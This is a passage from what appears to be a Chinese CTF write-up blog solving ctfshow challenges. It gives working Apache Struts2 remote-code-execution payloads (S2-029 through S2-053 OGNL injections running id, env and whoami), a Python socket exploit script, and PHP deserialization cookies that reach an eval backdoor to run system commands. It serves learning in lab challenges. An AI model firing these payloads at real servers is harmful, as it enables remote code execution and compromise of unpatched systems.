class="language-markup">?debug&#x3D;command&amp;expression&#x3D;%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%27%65%6e%76%27%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6f%75%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%0a</code></pre><p>这里用那个printenv就不行</p><h1 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h1><h3 id="S2-029"><a href="#S2-029" class="headerlink" title="S2-029"></a>S2-029</h3><p>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估<br>例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行<br>影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）<br>poc：</p><pre class="language-markup" data-language="markup"><code class="language-markup">default.action?message&#x3D;(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()))</code></pre><p>payload：</p><pre class="language-markup" data-language="markup"><code class="language-markup">default.action?message&#x3D;(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream()))</code></pre><h1 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h1><h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><p>漏洞原理<br>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:<name>的方式来调用名字是<name>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞<br>影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)<br>poc：</p><pre class="language-markup" data-language="markup"><code class="language-markup">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;env</code></pre><h1 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h1><h3 id="S2-033"><a href="#S2-033" class="headerlink" title="S2-033"></a>S2-033</h3><p>漏洞原理<br>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行<br>影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</p><pre class="language-markup" data-language="markup"><code class="language-markup">orders&#x2F;4&#x2F;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj&#x3D;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content&#x3D;2908&amp;command&#x3D;env</code></pre><h1 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h1><h3 id="S2-037"><a href="#S2-037" class="headerlink" title="S2-037"></a>S2-037</h3><p>漏洞原理<br>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式<br>影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</p><pre class="language-markup" data-language="markup"><code class="language-markup">&#x2F;orders&#x2F;3&#x2F;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj&#x3D;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content&#x3D;2908&amp;command&#x3D;whoami</code></pre><h1 id="web293"><a href="#web293" class="headerlink" title="web293"></a>web293</h1><h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><p>漏洞原理<br>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵<br>恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令<br>影响版本：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</p><pre class="language-markup" data-language="markup"><code class="language-markup">Content-Type: &quot;%&#123;(#nike&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;whoami&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; boundary&#x3D;----WebKitFormBoundaryXx80aU0pu6vrsV3z</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692543378438-72c29cb1-e05a-4f01-b514-425e311a76a2.png" alt="image.png"></p><h1 id="web294"><a href="#web294" class="headerlink" title="web294"></a>web294</h1><h3 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h3><p>漏洞原理<br>与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用\x00截断<br>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10<br>这里wp用的是用socket发包：</p><pre class="language-python" data-language="python"><code class="language-python">import socketq &#x3D; b&#39;&#39;&#39;------WebKitFormBoundaryXd004BVJN9pBYBL2Content-Disposition: form-data; name&#x3D;&quot;upload&quot;; filename&#x3D;&quot;%&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;X-Test&#39;,233*233)&#125;\x00b&quot;Content-Type: text&#x2F;plainfoo------WebKitFormBoundaryXd004BVJN9pBYBL2--&#39;&#39;&#39;.replace(b&#39;\n&#39;, b&#39;\r\n&#39;)p &#x3D; b&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1Host: localhost:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;56.0.2924.87 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: en-US,en;q&#x3D;0.8,es;q&#x3D;0.6Connection: closeContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryXd004BVJN9pBYBL2Content-Length: %d&#39;&#39;&#39;.replace(b&#39;\n&#39;, b&#39;\r\n&#39;) % (len(q), )with socket.create_connection((&#39;your-ip&#39;, &#39;8080&#39;), timeout&#x3D;5) as conn:    conn.send(p + q)    print(conn.recv(10240).decode())</code></pre><p>这个包没太发明白，过段时间在研究一下。<br>工具一把梭。</p><h1 id="web295"><a href="#web295" class="headerlink" title="web295"></a>web295</h1><h3 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h3><p>漏洞原理<br>漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用<br>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击<br>影响版本: 2.0.0 - 2.3.32<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692544961840-aeae9959-6449-4b32-9af1-ab5eda4bdcf6.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545103687-b986fa24-bac8-4ea5-9cca-49abb3bad411.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545142685-a66d184c-60e4-43f5-9103-5e0549c8f1df.png" alt="image.png"><br>佬のpoc：</p><pre class="language-java" data-language="java"><code class="language-java">%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q&#x3D;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())).(#q)&#125;</code></pre><p>把后面的id改为env会报错，但是看着这么眼熟，像是flag。提交之后发现真是对的：<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545401365-19dcf5d2-9d24-48e5-abfc-36b0079b8602.png" alt="image.png"><br>还可以用45的content-type</p><pre class="language-java" data-language="java"><code class="language-java">%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</code></pre><h1 id="web296"><a href="#web296" class="headerlink" title="web296"></a>web296</h1><h3 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h3><p>漏洞原理<br>Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：</p><table><thead><tr><th>扩展名</th><th>Content-Type</th><th>解析方法</th></tr></thead><tbody><tr><td>xml</td><td>application&#x2F;xml</td><td>xstream</td></tr><tr><td>json</td><td>application&#x2F;json</td><td>jsonlib或jackson(可选)</td></tr><tr><td>xhtml</td><td>application&#x2F;xhtml+xml</td><td>无</td></tr><tr><td>无</td><td>application&#x2F;x-www-form-urlencoded</td><td>无</td></tr><tr><td>无</td><td>multipart&#x2F;form-data</td><td>无</td></tr></tbody></table><p>jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名：</p><pre class="language-none"><code class="language-none">&lt;classname&gt;&lt;&#x2F;classname&gt;&#x2F;&#x2F;或者&lt;paramname class&#x3D;&quot;classname&quot;&gt;&lt;&#x2F;paramname&gt;</code></pre><p>所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedget<br>影响版本：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12<br><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md</a><br>建议直接工具启动！</p><h1 id="web297"><a href="#web297" class="headerlink" title="web297"></a>web297</h1><h3 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h3><p>漏洞原理<br>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞<br>poc</p><pre class="language-none"><code class="language-none">%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;printenv | grep FLAG&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</code></pre><h1 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h1><blockquote><p>工具：<a href="https://github.com/java-decompiler/jd-gui/releases">https://github.com/java-decompiler/jd-gui/releases</a></p></blockquote><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>提示：看看代码，了解下和php不一样的地方<br>题目附件一个war包<br>jar包和war包都可以看成压缩文件，都可以用解压软件打开，jar包和war包都是为了项目的部署和发布，通常在打包部署的时候，会在里面加上部署的相关信息。这个打包实际上就是把代码和依赖的东西压缩在一起，变成后缀名为.jar和.war的文件，就是我们说的jar包和war包。但是这个“压缩包”可以被编译器直接使用，把war包放在tomcat目录的webapp下，tomcat服务器在启动的时候可以直接使用这个war包。通常tomcat的做法是解压，编译里面的代码，所以当文件很多的时候，tomcat的启动会很慢。<br>jar包和war包的区别：jar包是java打的包，war包可以理解为javaweb打的包，这样会比较好记。jar包中只是用java来写的项目打包来的，里面只有编译后的class和一些部署文件。而war包里面的东西就全了，包括写的代码编译成的class文件，依赖的包，配置文件，所有的网站页面，包括html，jsp等等。一个war包可以理解为是一个web项目，里面是项目的所有东西。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692546287592-358916c4-a359-4a79-b07b-32ae6fb35c9c.png" alt="image.png"><br>然后去看这个getVipStatus：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547078594-3886eb60-120b-4d06-b79e-d8cfe8206fd1.png" alt="image.png"><br>但是不知道在哪里加入username和password，看了wp发现是在：</p><pre class="language-none"><code class="language-none">&#x2F;ctfshow&#x2F;login?username&#x3D;admin&amp;password&#x3D;ctfshow</code></pre><p>但是不知道这个路径是哪里来的。</p><h1 id="web299"><a href="#web299" class="headerlink" title="web299"></a>web299</h1><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547324053-0afe36c1-6e1c-4a6b-a225-cd24938ac84d.png" alt="image.png"><br>访问之后发现页面没变化，感觉像是文件读取。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547431499-7895a6b5-2af5-4057-97c9-a837ecb8de82.png" alt="image.png"><br>确实可以读取，按照上一道题的文件内容访问一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547505252-22399b93-619d-49a0-9b4f-7bfe36fe2c57.png" alt="image.png"><br>终于懂了他这个路径了：<br>访问<code>WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</code><br>发现疑似flag文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547630499-b459228b-a93a-428f-92ff-6a283f7fea98.png" alt="image.png"><br>访问<code>/fl3g</code>得目录穿越一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547692626-234dd616-bf9d-4eb3-9003-4431915f9fc8.png" alt="image.png"></p><h1 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h1><p>类似上题，但是文件名为<code>/f1bg</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547796528-d30aa8b6-7ed2-48d8-8352-c0651a92428e.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web254-web278反序列化篇</title>
      <link href="/posts/a574213f/"/>
      <url>/posts/a574213f/</url>
      
        <content type="html"><![CDATA[<h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><p>和反序列化没啥关系，可能只是来了解一下代码：</p><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;  public $username&#x3D;&#39;xxxxxx&#39;;  public $password&#x3D;&#39;xxxxxx&#39;;  public $isVip&#x3D;false;  public function checkVip()&#123;    return $this-&gt;isVip;  &#125;  public function login($u,$p)&#123;    if($this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p)&#123;      $this-&gt;isVip&#x3D;true;    &#125;    return $this-&gt;isVip;  &#125;  public function vipOneKeyGetFlag()&#123;    if($this-&gt;isVip)&#123;      global $flag;      echo &quot;your flag is &quot;.$flag;    &#125;else&#123;      echo &quot;no vip, no flag&quot;;    &#125;  &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;  $user &#x3D; new ctfShowUser();  if($user-&gt;login($username,$password))&#123;    if($user-&gt;checkVip())&#123;      $user-&gt;vipOneKeyGetFlag();    &#125;  &#125;else&#123;    echo &quot;no vip,no flag&quot;;  &#125;&#125;</code></pre><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</code></pre><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;    public $username&#x3D;&#39;xxxxxx&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public $isVip&#x3D;false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;</code></pre><p>cookie传入反序列化参数，这里需要注意一个卡了我挺长时间的点就是分号作为cookie中分割符，反序列化中出现的分号要用url转义。</p><pre class="language-php" data-language="php"><code class="language-php">class ctfShowUser&#123;    public $username&#x3D;&#39;xxxxxx&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public $isVip&#x3D;true;&#125;$a &#x3D; new ctfShowUser();echo str_replace(&#39;;&#39;, &#39;%3B&#39;, serialize($a));</code></pre><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">GET：?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxxCOOKIE：user&#x3D;O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;%3Bs:6:&quot;xxxxxx&quot;%3Bs:8:&quot;password&quot;%3Bs:6:&quot;xxxxxx&quot;%3Bs:5:&quot;isVip&quot;%3Bb:1%3B&#125;</code></pre><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;    public $username&#x3D;&#39;xxxxxx&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public $isVip&#x3D;false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            if($this-&gt;username!&#x3D;&#x3D;$this-&gt;password)&#123;                    echo &quot;your flag is &quot;.$flag;              &#125;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;</code></pre><pre class="language-php" data-language="php"><code class="language-php">class ctfShowUser&#123;    public $username&#x3D;&#39;admin&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public $isVip&#x3D;true;&#125;$a &#x3D; new ctfShowUser();echo urlencode(serialize($a));</code></pre><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">?username&#x3D;admin&amp;password&#x3D;xxxxxxCOOKIEuser&#x3D;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></pre><h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><pre class="language-php" data-language="php"><code class="language-php">class ctfShowUser&#123;    private $username&#x3D;&#39;xxxxxx&#39;;    private $password&#x3D;&#39;xxxxxx&#39;;    private $isVip&#x3D;false;    private $class &#x3D; &#39;info&#39;;    public function __construct()&#123;        $this-&gt;class&#x3D;new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user&#x3D;&#39;xxxxxx&#39;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);    $user-&gt;login($username,$password);&#125;</code></pre><pre class="language-php" data-language="php"><code class="language-php">class ctfShowUser&#123;    private $username&#x3D;&#39;xxxxxx&#39;;    private $password&#x3D;&#39;xxxxxx&#39;;    private $isVip&#x3D;false;    private $class &#x3D; &#39;info&#39;;    public function __construct()&#123;        $this-&gt;class&#x3D;new backDoor();    &#125;&#125;class backDoor&#123;    private $code &#x3D; &#39;system(&quot;tac f*&quot;);&#39;;&#125;$a &#x3D; new ctfShowUser();$b &#x3D; new backDoor();echo &quot;&lt;br&gt;&quot;.urlencode(serialize($a));</code></pre><pre class="language-php" data-language="php"><code class="language-php">GET：?username&#x3D;admin&amp;password&#x3D;aaaCOOKIE：user&#x3D;O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%22tac+f%2A%22%29%3B%22%3B%7D%7D</code></pre><h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    public $username&#x3D;&#39;xxxxxx&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public $isVip&#x3D;false;    public $class &#x3D; &#39;info&#39;;    public function __construct()&#123;        $this-&gt;class&#x3D;new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    public $user&#x3D;&#39;xxxxxx&#39;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    public $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    if(!preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $_COOKIE[&#39;user&#39;]))&#123;        $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);    &#125;    